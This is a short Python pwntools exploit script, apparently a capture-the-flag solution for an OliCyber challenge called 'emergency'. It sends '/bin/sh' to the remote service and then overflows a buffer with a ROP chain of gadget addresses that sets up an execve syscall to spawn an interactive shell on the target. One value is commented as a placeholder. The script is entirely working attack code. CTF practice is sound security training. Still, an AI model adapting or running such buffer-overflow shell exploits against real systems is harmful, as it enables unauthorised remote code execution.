from pwn import *
r = remote("emergency.challs.olicyber.it", 10306)
r.recv(1000)
r.send(b'/bin/sh\x00')

payload = b'a'*40
payload += p64(0x401032) # pop rdi
payload += p64(59)        # placeholder, da sostituire
payload += p64(0x401038) # xor rax, edi
payload += p64(0x401032) # pop rdi
payload += p64(0x404000)
payload += p64(0x401034) # pop rsi
payload += p64(0)
payload += p64(0x401036) # pop rdx
payload += p64(0)
payload += p64(0x40101a) # syscall

r.recv(1000)
r.send(payload + b'\x00')
r.interactive()